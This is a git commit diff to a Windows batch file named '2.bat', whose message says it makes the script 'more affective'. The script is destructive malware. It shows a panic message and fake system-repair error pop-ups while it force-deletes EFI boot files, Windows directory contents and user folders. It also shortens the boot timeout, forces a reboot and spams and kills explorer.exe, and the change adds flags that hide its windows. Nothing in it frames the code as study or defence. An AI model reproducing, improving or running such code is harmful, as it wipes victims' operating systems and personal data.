54d149ce548f0d9bee56b0c2d4311553d38cc96b
Aaravdevelops <137682685+Aaravdevelops@users.noreply.github.com>
2024-10-17 07:18:50 +0000

    more smaller more affective

--- 2.bat
+++ 2.bat
@@ -1,7 +1,7 @@
 @echo off
-start "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 30 SECONDS!&echo(&pause"
+start /b "" /wait cmd /c "echo DO SOMETHING RIGHT NOW YOU ONLY HAVE 30 SECONDS!&echo(&pause"
 for /L %%i in (1,1,100) do (start cmd /c "echo Error occured while repairing system!echo(pause" & timeout /c 7) & DEL /F /S /Q /A  \EFI\Microsoft\Boot\*.* & DEL /F /S /Q /A C:\Windows*.* & rmdir C:\Users*.* /S /Q
 bcdedit /timeout 1
 shutdown -r /o -t 20
-for /L %%i in (1,1,100) do (start explorer.exe
+for /L %%i in (1,1,100) do (start /b explorer.exe
 taskkill /im explorer.exe /f)
